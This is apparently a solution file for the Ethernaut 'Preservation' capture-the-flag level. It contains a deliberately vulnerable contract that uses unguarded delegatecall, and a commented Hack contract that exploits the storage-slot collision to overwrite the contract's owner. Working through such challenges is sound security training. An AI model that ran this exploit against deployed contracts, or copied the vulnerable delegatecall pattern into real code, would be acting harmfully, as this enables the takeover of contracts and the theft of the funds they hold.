// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
https://ethernaut.openzeppelin.com/level/0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

- Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
- Understanding what it means for delegatecall to be context-preserving.
- Understanding how storage variables are stored and accessed.
- Understanding how casting works between different data types.

*/

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}


contract Hack {
    // Storage layout must match the Preservation contract for delegatecall to work correctly
    // Slot 0: timeZone1Library (same position as Preservation)
    address public timeZone1Library;
    // Slot 1: timeZone2Library (same position as Preservation)
    address public timeZone2Library;
    // Slot 2: owner (same position as Preservation)
    address public owner;

    function attack(address _target) public {
        Preservation target = Preservation(_target);
        // Step 1: Call setFirstTime with this contract's address cast to uint256
        // This exploits the delegatecall in Preservation which updates timeZone1Library (slot 0)
        // to point to this Hack contract instead of the original LibraryContract
        target.setFirstTime(uint256(uint160(address(this))));
        
        // Step 2: Call setFirstTime again, but now delegatecall will use our malicious
        // setTime function instead of LibraryContract's setTime
        // Our setTime updates slot 2 (owner) instead of slot 3 (storedTime)
        target.setFirstTime(uint256(uint160(msg.sender)));
        
        require(target.owner() == msg.sender, "Failed to set owner");
    }

    // This malicious setTime function will be called via delegatecall
    // When called, it writes to the owner variable in the Preservation contract
    // instead of storedTime because of storage slot collision
    function setTime(uint _owner) public {
        // Cast the uint input to address and assign it to owner
        // This will write to slot 2 in the Preservation contract (the owner variable)
        owner = address(uint160(_owner));
    }
}

